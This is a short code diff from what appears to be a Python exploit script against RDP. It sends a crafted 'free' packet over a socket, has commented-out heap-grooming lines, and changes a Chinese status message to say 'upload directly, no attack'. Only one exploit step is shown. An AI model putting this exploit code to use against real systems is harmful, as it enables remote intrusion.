@@ -186,7 +186,7 @@ def main():
     s.sendall(rdp.free_32(crypter))
     time.sleep(.15)
 
-    print("正在使用新代码 直接上传")
+    print("正在使用新代码 直接上传 不攻击")
     # print('[+] allocating fake objects')
     # while count < times:
 
